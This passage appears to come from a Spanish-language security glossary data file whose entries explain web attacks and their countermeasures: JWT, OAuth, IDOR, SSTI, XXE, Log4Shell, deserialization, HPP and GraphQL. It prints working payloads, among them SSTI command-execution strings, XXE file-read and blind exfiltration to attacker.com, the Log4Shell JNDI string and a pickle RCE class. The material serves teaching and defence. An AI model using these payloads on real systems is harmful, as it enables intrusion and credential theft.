      "El header puede apuntar a una URL de la clave (`jku`). Si el server la baja sin whitelist, el atacante hostea su propia clave y firma.\n" +
      "\n**Contramedidas:**\n" +
      "• **Whitelist de algs**: `if (alg !== 'RS256') reject`.\n" +
      "• **Secrets fuertes** de ≥256 bits, generados aleatoriamente.\n" +
      "• **Whitelist de jku/x5u** URLs.\n" +
      "• Preferir **PASETO** o **JWT alternativos** (Branca, Fernet) que no tienen esta superficie.\n" +
      "> 💡 **jwt.io** te decodifica y firma con tu secret guessed — herramienta indispensable en pentests.\n" +
      "> ⚠️ Case: Auth0, Firebase Auth, y varios frameworks tuvieron CVEs de key confusion 2017-2020.",
    examples: [
      "Auth0 CVE-2020-28460: HS256/RS256 confusion en algunas configs.",
      "hashcat crackea `secret` en <1s con rockyou.txt.",
      "Herramientas: jwt_tool.py, PortSwigger's JWT Editor extension.",
    ],
    related: ["OWASP Top 10", "OAuth 2.0 flow attacks (redirect_uri, PKCE bypass)", "AAA (Autenticación, Autorización, Accounting)", "MFA y autenticación moderna"],
  },
  {
    id: 246,
    module: 21,
    term: "OAuth 2.0 flow attacks (redirect_uri, PKCE bypass)",
    short: "OAuth es un protocolo de autorización complejo con vectores heredados; open redirect en redirect_uri, PKCE bypass y state absent son los top 3.",
    detail:
      "**OAuth 2.0** delega **autorización** a un IdP (Google, GitHub, Auth0). El *authorization code flow* moderno es el estándar. Cada paso tiene su vector.\n" +
      "\n**Vector 1: `redirect_uri` open redirect**\n" +
      "El client registra un `redirect_uri` en el IdP. Si la validación acepta:\n" +
      "• `https://miapp.com/callback` (correcto) → OK.\n" +
      "• `https://miapp.com.evil.com/callback` (subdominio manipulado) → si el IdP usa `startsWith` sin normalizar, acepta.\n" +
      "• `https://miapp.com/callback?next=//evil.com` (open redirect en la app) → chain: auth code enviado a atacante.\n" +
      "**Fix**: exact-match del `redirect_uri` completo.\n" +
      "\n**Vector 2: sin `state` = CSRF**\n" +
      "El `state` es un token opaco que el client genera antes del redirect y verifica al callback. Sin él, el atacante puede **loguear a la víctima con su cuenta** (session fixation) o hacer accept-only-my-code attacks. Debe ser: aleatorio, ligado a la sesión, verificado al retorno.\n" +
      "\n**Vector 3: PKCE bypass (SPAs y mobile)**\n" +
      "**PKCE** (*Proof Key for Code Exchange*, RFC 7636) fue creado para clients públicos (SPA, mobile) que no pueden guardar un client_secret. Genera un `code_verifier` random + `code_challenge = sha256(verifier)`.\n" +
      "• El auth request incluye `code_challenge`.\n" +
      "• El token request incluye `code_verifier` (el IdP compara).\n" +
      "\n**Bypasses de PKCE:**\n" +
      "• `code_challenge_method=plain` — se manda el verifier tal cual como challenge. Si un MITM intercepta el request, roba y usa. Fix: forzar `S256`.\n" +
      "• IdP que **acepta requests sin code_verifier** para el flow que también acepta PKCE (fallback silencioso). Fix: rechazar si PKCE fue iniciado y no completado.\n" +
      "\n**Vector 4: Implicit flow (deprecado)**\n" +
      "Antes de PKCE, SPAs usaban *implicit flow* — el access_token venía en el fragment de URL. Filtraciones vía Referer, extensiones, service workers. Hoy prohibido por OAuth 2.1.\n" +
      "\n**Vector 5: Refresh token infinito**\n" +
      "Si el refresh token no rota y no expira, un roll perdido = acceso perpetuo. Fix: **refresh token rotation** + detection de reuse (revoca la familia entera).\n" +
      "> 💡 **OAuth 2.1** (draft) consolida best practices: PKCE obligatorio, exact redirect_uri, sin implicit, rotación de refresh.\n" +
      "> ⚠️ Caso real: **Grammarly 2019** — vulnerabilidad de OAuth permitió a un attacker sitio robar tokens de millones de usuarios (redirect_uri mal validado).",
    examples: [
      "Grammarly 2019 CVE: redirect_uri con subdominio malicioso aceptado.",
      "Rotación de refresh token: revocar toda la familia si detecta reuse.",
      "Herramienta: EchoGrab, Burp Extension oauth_scan.",
    ],
    related: ["JWT attacks: alg=none, key confusion, weak secret", "OWASP Top 10", "Cross-Site Request Forgery (CSRF)", "Consent phishing (illicit OAuth grant)"],
  },
  {
    id: 247,
    module: 21,
    term: "BOLA / IDOR y Broken Object Level Auth",
    short: "El bug #1 de APIs modernas: /api/users/123 devuelve el objeto sin verificar que 123 pertenezca al caller.",
    detail:
      "**BOLA** (*Broken Object Level Authorization*) es **#1 en OWASP API Top 10** (2023). Sinónimo del clásico **IDOR** (*Insecure Direct Object Reference*). El bug es simple: el endpoint recibe un `id` en URL/body y devuelve el objeto **sin verificar que el usuario tenga derecho**.\n" +
      "\n**Ejemplo canónico:**\n" +
      "```\nGET /api/orders/12345\n// Server: SELECT * FROM orders WHERE id=12345;\n// Falta: AND user_id = $current_user\n```\n" +
      "Cualquier usuario autenticado ve pedidos de todos los demás.\n" +
      "\n**Variantes:**\n" +
      "| Tipo | Vector |\n" +
      "|---|---|\n" +
      "| **Numeric IDOR** | IDs secuenciales (`/orders/12345` → `12344`, `12346`) |\n" +
      "| **UUID IDOR** | UUID no aleatorio (v1 basado en MAC + tiempo) o filtrado en respuesta |\n" +
      "| **Path IDOR** | `/api/tenants/mine` vs `/api/tenants/{otro-tenant}/data` |\n" +
      "| **Verb tampering** | GET permitido, POST/PUT/DELETE no verificados |\n" +
      "| **Mass assignment** | PATCH con `{\"role\": \"admin\"}` en body → escala si el server no whitelistea fields |\n" +
      "\n**Detección:**\n" +
      "• Escaneo automatizado no ayuda mucho — requiere entender el contexto de negocio.\n" +
      "• **Burp Autorize / AuthMatrix** — envían cada request con las cookies de otro user, comparan responses.\n" +
      "• Fuzzing de IDs adyacentes y monitoreo de éxito.\n" +
      "\n**Contramedidas:**\n" +
      "• **Authorization en cada endpoint** — no confiar en 'está autenticado, listo'.\n" +
      "• Preferir **UUIDs v4 aleatorios** en URLs (dificulta enumeración, aunque no autoriza).\n" +
      "• **Row-level security** en DB (Postgres RLS, Supabase RLS) — la DB filtra por `auth.uid()`.\n" +
      "• **API Gateway policies** de authorization declarativa.\n" +
      "> 💡 Alan Beckley (Facebook 2013): pagó por probar que él era otro user. Cada botón del UI accedía a IDs adyacentes de otros users. $10K bounty por 1 hora de work.\n" +
      "> ⚠️ **BOLA es dominante en APIs GraphQL** — el atacante enumera todos los tipos con introspection y hace queries a IDs arbitrarios. Deshabilitar introspection en prod es solo el primer paso.",
    examples: [
      "Uber 2016: bug de IDOR permitía cancelar rides de otros users.",
      "Row-level security en Supabase: `USING (user_id = auth.uid())` en policy RLS.",
      "Facebook 2013: cualquier user id accedía a datos de otros vía APIs mal autorizadas.",
    ],
    related: ["OWASP Top 10", "Modelos de autorización", "Principio de mínimo privilegio", "AAA (Autenticación, Autorización, Accounting)"],
  },
  {
    id: 248,
    module: 21,
    term: "Business logic vulnerabilities",
    short: "El código funciona, cada request pasa validación — pero la combinación permite fraude. Requiere entender el negocio, no solo la stack.",
    detail:
      "Las **business logic vulns** no son bugs de código sino **de diseño**. Cada request individualmente es válido, pero la **secuencia** o **combinación** rompe la lógica del negocio. No las encuentra ningún scanner: requieren entender el flujo.\n" +
      "\n**Categorías clásicas:**\n" +
      "\n**1. Race conditions (TOCTOU en el checkout)**\n" +
      "```\nStep 1: Aplicar código descuento 50%OFF (checked once) → precio 5€\nStep 2: Múltiples requests paralelos de 'apply-coupon' → aplica 50% varias veces → precio 0€ o negativo\n```\n" +
      "Fix: locks pesimistas, idempotency keys, verificar que el precio final coincida.\n" +
      "\n**2. Cambio de rol via multi-step flow**\n" +
      "```\nStep 1: Solicitar signup como user → OK\nStep 2: Verificar email (JWT no incluye role)\nStep 3: Enviar profile con {role: 'admin'} → server acepta (mass assignment)\n```\n" +
      "\n**3. Coupon abuse**\n" +
      "```\n- Códigos que no expiran cuando debían.\n- Un código NEWUSER10 usado por el mismo user 100 veces.\n- Códigos derivables (WELCOME10 → WELCOME15, WELCOME20).\n- Combinación de códigos no permitida por diseño pero server acepta.\n```\n" +
      "\n**4. Free-tier abuse**\n" +
      "```\n- Registrar cuentas infinitas con `+alias` en gmail (foo+1@, foo+2@).\n- El sistema NO normaliza el email antes de checkear duplicados.\n- Cada cuenta obtiene crédito free → costo real para la empresa.\n```\n" +
      "\n**5. Workflow bypass**\n" +
      "```\n/purchase → /payment → /confirmation → order_placed=true\nAtacante hace directo → /confirmation (skip payment) → order_placed=true si no valida flujo.\n```\n" +
      "\n**Casos famosos:**\n" +
      "• **Starbucks 2015** — race condition en gift cards permitió transferencia doble.\n" +
      "• **Instacart 2020** — códigos de refund reutilizables.\n" +
      "• **Airbnb 2019** — bypass de proceso de refund via API directa.\n" +
      "\n**Testing:**\n" +
      "• **Threat modeling** del flujo antes que fuzzer.\n" +
      "• **Race conditions**: Burp Turbo Intruder para envíos paralelos.\n" +
      "• **State machine analysis**: mapear estados válidos y probar transiciones inválidas.\n" +
      "> 💡 **PortSwigger Academy** tiene labs excelentes de business logic — nada reemplaza pensar como un fraudster.\n" +
      "> ⚠️ Estos bugs son **hard to detect** en producción: los logs muestran 'todo OK' porque cada request individualmente lo era.",
    examples: [
      "Turbo Intruder para race condition: 100 requests paralelos con `--filter '=200'`.",
      "Threat model: mapear estados del checkout y probar cada transición inválida.",
      "Instacart 2020: refunds reutilizables por lógica de negocio, no XSS/SQLi.",
    ],
    related: ["OWASP Top 10", "BOLA / IDOR y Broken Object Level Auth", "Ataques a MFA", "Insecure Design y Security Misconfiguration"],
  },
  {
    id: 249,
    module: 21,
    term: "Server-Side Template Injection (SSTI)",
    short: "Un template engine (Jinja2, Twig, ERB) que evalúa input del usuario permite RCE en el servidor.",
    detail:
      "**SSTI** ocurre cuando la app pasa **input del usuario a un template engine** que lo interpreta como código. El engine tiene acceso a objetos internos (Python, Ruby, Node) → escalada a **RCE**.\n" +
      "\n**Detección — payloads de diagnóstico:**\n" +
      "| Payload | Engine | Response |\n" +
      "|---|---|---|\n" +
      "| `{{7*7}}` | Jinja2, Twig, Freemarker | `49` |\n" +
      "| `${7*7}` | Freemarker, JSP EL | `49` |\n" +
      "| `<%= 7*7 %>` | ERB (Ruby) | `49` |\n" +
      "| `#{7*7}` | Slim, Ruby | `49` |\n" +
      "| `${{7*7}}` | Handlebars | `{7*7}` (no evalúa) |\n" +
      "\n**Explotación por engine:**\n" +
      "\n**Jinja2 (Python)** — el clásico. `{{}}` evalúa expresiones:\n" +
      "```python\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n// Enumera subclasses; buscar `Popen` → ejecutar comandos\n{{ config.__class__.__init_subclasses__.__self__.subclasses()[100]('id', shell=True, stdout=-1).communicate() }}\n```\n" +
      "\n**Twig (PHP)**:\n" +
      "```\n{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}{{ _self.env.getFilter(\"id\") }}\n```\n" +
      "\n**Freemarker (Java)**:\n" +
      "```\n<#assign x=\"freemarker.template.utility.Execute\"?new()>${ x(\"id\") }\n```\n" +
      "\n**Casos reales:**\n" +
      "• **Uber 2016** — Jinja2 SSTI en un dashboard interno → RCE en servidor de prod.\n" +
      "• **PayPal 2016** — SSTI en Java Freemarker.\n" +
      "• **CVE-2022-42889 (Text4Shell)** — Apache Commons Text con `${prefix:name}` interpretado como SSTI.\n" +
      "\n**Contramedidas:**\n" +
      "• **Nunca pasar input al template como código** — usar templates *parametrizados* (contexto que se sustituye, no evalúa).\n" +
      "• **Sandbox del engine** — `SandboxedEnvironment` en Jinja2, `ConfigurableTemplateResolver` en Thymeleaf.\n" +
      "• **Auditoría de sink**: buscar `render_template_string(user_input)`, `Template.new(user_input).render()`.\n" +
      "• **CSP** no ayuda — SSTI es server-side.\n" +
      "> 💡 **Portswigger's SSTI mapa** es la referencia — cubre engines y payloads.\n" +
      "> ⚠️ **Server-side ≠ client-side template**. Angular / React tienen bugs de template injection también pero son XSS (cliente).",
    examples: [
      "Uber 2016: SSTI en Jinja2 escaló a RCE via `__mro__` enumeration.",
      "Text4Shell CVE-2022-42889: input con `${script:javascript:...}` → RCE.",
      "SandboxedEnvironment en Jinja2 limita atributos permitidos.",
    ],
    related: ["OWASP Top 10", "Cross-Site Scripting (XSS)", "Log4Shell y JNDI injection", "Insecure Design y Security Misconfiguration"],
  },

  // ── M22 · OWASP Top 10 (Parte 2) ─────────────────────────────────────────
  {
    id: 250,
    module: 22,
    term: "Vulnerable and Outdated Components",
    short: "A06: usar librerías o software con vulnerabilidades conocidas.",
    detail:
      "**A06**: las apps modernas dependen de cientos de **componentes de terceros**; si alguno tiene una CVE conocida y no se parchea, se hereda el riesgo. **Log4Shell** es el ejemplo perfecto.\n" +
      "> 💡 Defensa: inventario de dependencias (**SBOM**), escaneo SCA (Snyk, Dependabot) y actualización continua.",
    examples: [
      "Una app con una versión vulnerable de Log4j (Log4Shell).",
      "Dependabot abriendo PRs para parchear librerías con CVE.",
    ],
    related: ["CVE y CVSS", "Software and Data Integrity Failures", "OWASP Top 10"],
  },
  {
    id: 251,
    module: 22,
    term: "Identification and Authentication Failures",
    short: "A07: fallos en login, sesiones y gestión de credenciales.",
    detail:
      "**A07** abarca autenticación débil: permitir **fuerza bruta**/credential stuffing, contraseñas débiles, **gestión de sesión** insegura (tokens predecibles, sin expiración), o falta de **MFA**. La identidad es la puerta de entrada, así que es un objetivo prioritario.",
    examples: [
      "Login sin rate limiting vulnerable a credential stuffing.",
      "Tokens de sesión que no expiran ni se invalidan al cerrar sesión.",
    ],
    related: ["AAA (Autenticación, Autorización, Accounting)", "Broken Access Control", "OWASP Top 10"],
  },
  {
    id: 252,
    module: 22,
    term: "Software and Data Integrity Failures",
    short: "A08: confiar en código o datos sin verificar su integridad (cadena de suministro).",
    detail:
      "**A08**: actualizaciones, plugins o pipelines CI/CD sin **verificación de integridad** (firmas). Incluye la **deserialización insegura** y los ataques a la **cadena de suministro** como **SolarWinds**.\n" +
      "> 💡 Defensa: firmar artefactos, verificar firmas/hashes y proteger el pipeline de build.",
    examples: [
      "Una actualización troyanizada por un proveedor comprometido (SolarWinds).",
      "Deserializar objetos no confiables y lograr RCE.",
    ],
    related: ["Firmas digitales", "Vulnerable and Outdated Components", "OWASP Top 10"],
  },
  {
    id: 253,
    module: 22,
    term: "Security Logging and Monitoring Failures",
    short: "A09: sin logs ni alertas, los ataques pasan desapercibidos.",
    detail:
      "**A09**: la falta de **registro, monitoreo y alertas** hace que las brechas se detecten tarde (el tiempo medio de detección se mide en meses). No basta con loguear: hay que **alertar** sobre eventos sospechosos y conservar evidencia para forense.",
    examples: [
      "Logins fallidos masivos que nunca generan una alerta.",
      "Sin logs, no se puede reconstruir cómo entró el atacante.",
    ],
    related: ["Detección de anomalías en tráfico", "OWASP Top 10"],
  },
  {
    id: 254,
    module: 22,
    term: "Server-Side Request Forgery (SSRF)",
    short: "A10: el servidor es engañado para hacer peticiones a destinos elegidos por el atacante.",
    detail:
      "**A10 SSRF**: la app toma una URL del usuario y la pide **desde el servidor**, permitiendo alcanzar **servicios internos** no expuestos o el **endpoint de metadata cloud**:\n" +
      "http://169.254.169.254/latest/meta-data/\n" +
      "> ⚠️ El caso **Capital One (2019)** explotó SSRF para robar credenciales IAM de AWS y datos de 100M+ personas. Defensa: allowlist de destinos, bloquear IPs internas/metadata, validar URLs.",
    examples: [
      "Apuntar un parámetro 'url' a 169.254.169.254 para leer credenciales IAM.",
      "Escanear servicios internos desde el servidor vulnerable.",
    ],
    related: ["SSRF y metadata cloud", "OWASP Top 10", "Headers de seguridad"],
  },
  {
    id: 255,
    module: 22,
    term: "XML External Entity (XXE)",
    short: "Un parser XML que resuelve entidades externas permite SSRF, file disclosure y DoS. Log4Shell primo mayor.",
    detail:
      "**XXE** ocurre cuando un parser XML acepta entradas del usuario y **procesa entidades externas** (`<!ENTITY x SYSTEM \"...\">`) sin restringir. La entidad puede apuntar a un archivo local, URL interna o generar loops de expansión.\n" +
      "\n**Payload clásico — file disclosure:**\n" +
      "```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>\n```\n" +
      "El parser lee `/etc/passwd` y lo incluye en el response.\n" +
      "\n**Payload — SSRF a metadata cloud:**\n" +
      "```xml\n<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">\n```\n" +
      "Roba credenciales IAM de una EC2 sin necesitar un SSRF explícito en la app.\n" +
      "\n**Blind XXE — cuando la response no refleja:**\n" +
      "```xml\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n  %dtd;\n]>\n```\n" +
      "El `evil.dtd` en el servidor del atacante:\n" +
      "```xml\n<!ENTITY % exfil \"<!ENTITY &#37; send SYSTEM 'http://attacker.com/?data=%file;'>\">\n%exfil;\n%send;\n```\n" +
      "El parser resuelve %file → lo manda al server del atacante. Out-of-band exfil.\n" +
      "\n**DoS: billion laughs (XML bomb):**\n" +
      "```xml\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n<!-- ... hasta lol9: 10^9 entradas -->\n```\n" +
      "OOM en segundos.\n" +
      "\n**Casos históricos:**\n" +
      "• **Facebook 2014** — XXE en el importer de OpenID XML ganó $30K bounty.\n" +
      "• **Google 2014** — XXE en la app de Toolbar's XML parser.\n" +
      "• **SharePoint (múltiples CVEs 2016-2019)**.\n" +
      "• **XmlRpcServer** en Java, PHP SimpleXML si `LIBXML_NOENT` activado.\n" +
      "\n**Contramedidas:**\n" +
      "• **Deshabilitar external entities** en el parser: `XMLInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false)` (Java), `libxml_disable_entity_loader(true)` (PHP <8), `defusedxml` (Python).\n" +
      "• **Preferir JSON** o formatos sin DTD.\n" +
      "• **WAF con detect de `<!DOCTYPE`** en request body.\n" +
      "> 💡 XML sigue ubicuo: SOAP, SAML, RSS, DOCX/XLSX, PDF, PostgreSQL XML columns. Cualquier parser XML es candidato.\n" +
      "> ⚠️ **SAML tiene XXE** en muchos IdP históricos — un login SAML manipulado podía leer secretos del servidor.",
    examples: [
      "Facebook OpenID: $30K bounty por XXE en 2014.",
      "defusedxml en Python: reemplazo seguro de lxml/xml.etree.",
      "OWASP XXE Cheat Sheet enumera configs seguras por lenguaje.",
    ],
    related: ["OWASP Top 10", "SSRF y metadata cloud", "Log4Shell y JNDI injection", "IMDSv2 y SSRF a metadata"],
  },
  {
    id: 256,
    module: 22,
    term: "Log4Shell y JNDI injection",
    short: "Cualquier input loggeado con Log4j 2.x <2.15 evaluaba ${jndi:ldap://evil} y descargaba código Java. El CVE de la década.",
    detail:
      "**CVE-2021-44228** — *Log4Shell*, diciembre 2021. Score CVSS **10.0**. Cientos de millones de servidores vulnerables globalmente.\n" +
      "\n**El bug:**\n" +
      "Log4j 2.x tenía **lookup substitution**: `${sys:user.name}`, `${env:HOME}`. Una de las lookups era `${jndi:...}` (Java Naming and Directory Interface), que hacía **lookups remotos** vía LDAP/RMI/DNS. Sin whitelist.\n" +
      "\n**Payload:**\n" +
      "```\n${jndi:ldap://attacker.com/Exploit}\n```\n" +
      "\n**Flow del ataque:**\n" +
      "1. Atacante envía payload en cualquier campo loggeado (User-Agent, X-Forwarded-For, body, subject de email).\n" +
      "2. El server llama `logger.info(request.getUserAgent())` → Log4j hace la sustitución.\n" +
      "3. Log4j conecta a `ldap://attacker.com` y sigue el reference.\n" +
      "4. LDAP responde con una URL HTTP a un `.class` malicioso.\n" +
      "5. Java baja y ejecuta el bytecode → **RCE**.\n" +
      "\n**Vectores creativos** (obtuvieron RCE):\n" +
      "• User-Agent en cualquier web app Java.\n" +
      "• Chat de Minecraft (loggeado por Log4j).\n" +
      "• Subject de un email pasando por un scanner Java.\n" +
      "• Field en un CSV importado por una app Java.\n" +
      "• Search bar en Elasticsearch queries.\n" +
      "\n**Mitigaciones (evolución de patches):**\n" +
      "| Versión | Fix |\n" +
      "|---|---|\n" +
      "| 2.15.0 | JNDI habilitado solo para localhost |\n" +
      "| 2.16.0 | Message lookups deshabilitados por default |\n" +
      "| 2.17.0 | Fix de infinite recursion DoS |\n" +
      "| 2.17.1 | Fix de RCE via JDBC Appender (CVE-2021-44832) |\n" +
      "\n**Detección:**\n" +
      "• **YARA/Sigma rules** buscando `${jndi:` en logs de acceso.\n" +
      "• **Canary tokens**: enviar `${jndi:ldap://canarytokens.com/uuid}` a tus propios servicios y alertar si el canary se dispara.\n" +
      "• **RASP** (Runtime Application Self-Protection) que detecta el JNDI lookup.\n" +
      "\n**JNDI injection generalizado:**\n" +
      "Log4Shell es un caso de **JNDI injection**. Otros vectores Java:\n" +
      "• Deserialización con `InitialContext.lookup(user_input)`.\n" +
      "• Spring Cloud Function `spel-injection` (CVE-2022-22963).\n" +
      "• JMS message driven beans con `Destination` controlada.\n" +
      "> 💡 SBOM + escaneo de dependencies transitivas (SCA) es el fix duradero — muchas orgs no sabían que tenían Log4j indirect.\n" +
      "> ⚠️ En 2023, algunos scanners aún encontraban Log4j vulnerables en cliente-side (Elastic Beanstalk, Docker images).",
    examples: [
      "Log4Shell canary: crear un DNS canary y probar en tu infra por payloads recibidos.",
      "SBOM audit: `mvn dependency:tree | grep log4j` — verificar cadena completa.",
      "RASP tools: Contrast Security, Signal Sciences, Imperva.",
    ],
    related: ["OWASP Top 10", "Vulnerable and Outdated Components", "XML External Entity (XXE)", "Server-Side Template Injection (SSTI)"],
  },
  {
    id: 257,
    module: 22,
    term: "Insecure Deserialization (Java, Python, PHP, .NET)",
    short: "Deserializar bytes controlados por atacante = RCE. Java ObjectInputStream, Python pickle, PHP unserialize son los principales offenders.",
    detail:
      "La **deserialización** convierte bytes en un objeto de un lenguaje. Si el input es controlado por el atacante, puede fabricar objetos que ejecutan código al construirse o al llamarles métodos.\n" +
      "\n**Java: ObjectInputStream**\n" +
      "El clásico. `ObjectInputStream.readObject()` reconstruye cualquier tipo del classpath. Si hay librerías con **gadget chains** (Apache Commons Collections, Spring, Hibernate), el atacante encadena llamadas a método hasta un `Runtime.exec()`.\n" +
      "```java\n// Vulnerable\nObjectInputStream ois = new ObjectInputStream(request.getInputStream());\nUser u = (User) ois.readObject(); // Ejecuta gadget si está en classpath\n```\n" +
      "Herramienta: **ysoserial** genera payloads para 30+ gadget chains.\n" +
      "\n**Python: pickle**\n" +
      "`pickle.loads()` es explícitamente inseguro (dice la doc). El `__reduce__` de una clase se ejecuta al deserializar:\n" +
      "```python\nimport pickle, os\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ('id',))\npayload = pickle.dumps(RCE())\n# Enviar payload — al pickle.loads() se ejecuta 'id'.\n```\n" +
      "**Uso común pero inseguro**: caching de sessions en Redis via pickle, ML models de tercero via `torch.load(untrusted)`.\n" +
      "\n**PHP: unserialize()**\n" +
      "`__wakeup()`, `__destruct()` en clases dispersas por el proyecto (Symfony, Laravel gadgets). El atacante manda un string `unserialize()` que reconstruye una cadena → RCE.\n" +
      "**Phar deserialization** — file wrappers `phar://` que trigger unserialize en `file_exists()`, `md5_file()`, etc.\n" +
      "\n**.NET: BinaryFormatter, DataContractSerializer**\n" +
      "Similar a Java. `BinaryFormatter` desaconsejado por Microsoft en 2020, deprecated 2022. Herramientas: **ysoserial.net**.\n" +
      "\n**Casos históricos:**\n" +
      "• **PayPal 2016 Struts** — Java deserialization RCE.\n" +
      "• **Jenkins 2017** — múltiples CVEs de deserialización en plugin ecosystem.\n" +
      "• **Log4Shell** es indirectamente una deserialización (JNDI → Java gadget).\n" +
      "• **PyTorch pickle** — modelos ML públicos con `__reduce__` malicioso.\n" +
      "\n**Contramedidas:**\n" +
      "• **JSON o Protobuf** en vez de serialización nativa. Nunca deserializar formato binario del usuario.\n" +
      "• **Whitelists de clases** — Java tiene `ObjectInputFilter` (JEP 290), .NET `SerializationBinder`.\n" +
      "• **Firma HMAC** de los blobs serializados si son inevitables (cookies, tokens).\n" +
      "• **SafePickle / dill sandboxed** en Python — o restringir con `RestrictedUnpickler`.\n" +
      "> 💡 **ysoserial** vs Java, **ysoserial.net** vs .NET son las biblias.\n" +
      "> ⚠️ La lección post-2016: **nunca deserializar un formato nativo binario controlado por el atacante**. Ninguna whitelist es 100% completa.",
    examples: [
      "ObjectInputFilter en Java 9+: `filter=java.util.**;!*`",
      "PyTorch: `torch.load(path, weights_only=True)` desde 2.4 evita pickle arbitrario.",
      "Auditoría PHP: `grep -r unserialize()` — buscar sinks.",
    ],
    related: ["OWASP Top 10", "Log4Shell y JNDI injection", "Vulnerable and Outdated Components", "Server-Side Template Injection (SSTI)"],
  },
  {
    id: 258,
    module: 22,
    term: "HTTP Parameter Pollution (HPP)",
    short: "Pasar el mismo parámetro múltiples veces — cada framework lo trata distinto y WAFs/apps se desalinean.",
    detail:
      "El **HPP** aprovecha que diferentes componentes de la request pipeline (WAF, load balancer, framework, código app) **interpretan parámetros repetidos diferente**. Esa desalineación crea vectores.\n" +
      "\n**Ejemplo básico:**\n" +
      "```\nGET /api/user?id=1&id=2\n```\n" +
      "| Sistema | Toma |\n" +
      "|---|---|\n" +
      "| PHP | Último (`id=2`) |\n" +
      "| ASP.NET | Comma-separated (`id=1,2`) |\n" +
      "| Node.js / Express | Array (`id=[1,2]`) |\n" +
      "| Spring Java | Primer (`id=1`) |\n" +
      "| Python Flask | Último (por default) |\n" +
      "| Ruby on Rails | Último |\n" +
      "\n**Vectores canónicos:**\n" +
      "\n**1. WAF bypass**\n" +
      "El WAF (Cloudflare, AWS WAF) inspecciona el primer parámetro y ve algo benigno. El backend Node.js toma el array `['benign', 'DROP TABLE users']` y usa el segundo:\n" +
      "```\nGET /search?q=hello&q=' OR '1'='1\n// WAF ve 'hello' (safe) → passes\n// Backend recibe payload SQLi\n```\n" +
      "\n**2. Auth bypass**\n" +
      "```\nPOST /reset_password\nuser_id=victim&user_id=attacker\n// WAF valida el primer (victim, aceptable si el user está autenticado)\n// Backend usa el segundo (attacker) para el password reset\n```\n" +
      "\n**3. HTTP Request Smuggling combinado** — HPP + CL.TE/TE.CL para hacer que el frontend vea unos parámetros y el backend otros.\n" +
      "\n**4. Path-based HPP** — no en query string sino en el path:\n" +
      "```\nGET /api/user/123/../456\n// El WAF normaliza `../` → ve `/api/user/456`\n// El backend NO normaliza → busca `123/../456` literal\n```\n" +
      "\n**5. Server-Side HPP (SHPP)** — el backend construye URLs internas incorporando input del usuario:\n" +
      "```\napp: `/internal-api?user=${user}&role=guest`\ninput user: `admin&role=admin`\nresult: `/internal-api?user=admin&role=admin&role=guest`\n// Backend interno toma primer → role=admin\n```\n" +
      "\n**Contramedidas:**\n" +
      "• **Normalizar antes de validar** — mismo componente decide qué parámetro se usa.\n" +
      "• **WAF que rechaza duplicados** cuando el backend no espera arrays.\n" +
      "• **Framework consistency** — configurar Node.js con `parameterLimit: 1` cuando no se esperan repeats.\n" +
      "• **Whitelist estricta** de valores esperados.\n" +
      "> 💡 **OWASP HPP Guide** enumera comportamientos por framework — invaluable en pentest.\n" +
      "> ⚠️ HPP en headers (`X-Forwarded-For: 1.2.3.4, 5.6.7.8` vs listado como duplicados) puede bypass IP-based auth.",
    examples: [
      "Bypass WAF de Cloudflare con `param=safe&param=<xss>`.",
      "Detection: canary detection en logs de duplicated params.",
      "Herramientas: HPP Finder (Burp Extension), OWASP ZAP HPP scan.",
    ],
    related: ["OWASP Top 10", "SQL Injection", "Cross-Site Scripting (XSS)", "HTTP Request Smuggling (CL.TE, TE.CL, H2.CL)"],
  },
  {
    id: 259,
    module: 22,
    term: "GraphQL security",
    short: "Introspection abuse, batching, aliases, y ausencia de rate-limit por field convierten a GraphQL en un vector propio.",
    detail:
      "**GraphQL** expone un solo endpoint (`/graphql`) que acepta queries flexibles. Su flexibilidad es su superficie: sin controles, un query puede pedir todo el schema, ejecutar cientos de operaciones en un request, o BOLA a escala.\n" +
      "\n**Vector 1: Introspection habilitada en prod**\n" +
      "```graphql\nquery { __schema { types { name fields { name } } } }\n```\n" +
      "Devuelve el schema completo — el atacante mapea todos los types, fields y arguments. **Deshabilitar en prod** (Apollo Server: `introspection: false`).\n" +
      "\n**Vector 2: Query batching abuse**\n" +
      "GraphQL permite mandar un array de queries en un solo request:\n" +
      "```json\n[\n  { \"query\": \"mutation { login(user:\\\"a\\\", pass:\\\"1\\\") { token } }\" },\n  { \"query\": \"mutation { login(user:\\\"a\\\", pass:\\\"2\\\") { token } }\" },\n  { \"query\": \"mutation { login(user:\\\"a\\\", pass:\\\"3\\\") { token } }\" }\n  // ... 1000 más\n]\n```\nBypass de rate-limit por HTTP request. **Contramedida**: contar operaciones dentro del batch, no HTTP requests.\n" +
      "\n**Vector 3: Alias overloading**\n" +
      "```graphql\nquery {\n  a1: login(user:\"a\", pass:\"1\") { token }\n  a2: login(user:\"a\", pass:\"2\") { token }\n  a3: login(user:\"a\", pass:\"3\") { token }\n  // ... 1000 aliases\n}\n```\nMismo effecto que batching, pero en una sola query. Rate-limit por HTTP no ayuda.\n" +
      "\n**Vector 4: Deep query / cyclic query DoS**\n" +
      "```graphql\nquery {\n  users {\n    friends {\n      friends {\n        friends {\n          friends { name }\n        }\n      }\n    }\n  }\n}\n```\nExplosión combinatoria — 100 users × 100 friends × 100 friends... = crashes.\n**Contramedida**: **query complexity analysis** (bibliotecas: graphql-query-complexity, graphql-cost-analysis) — asigna costo por field y rechaza queries > umbral.\n" +
      "\n**Vector 5: Field-level auth ausente**\n" +
      "Un user puede ver posts públicos pero no ver el `email` del owner. Sin auth por field:\n" +
      "```graphql\nquery { posts { title owner { email phone } } }\n```\nLeak. **Contramedida**: directivas `@auth` per-field, resolver-level middleware.\n" +
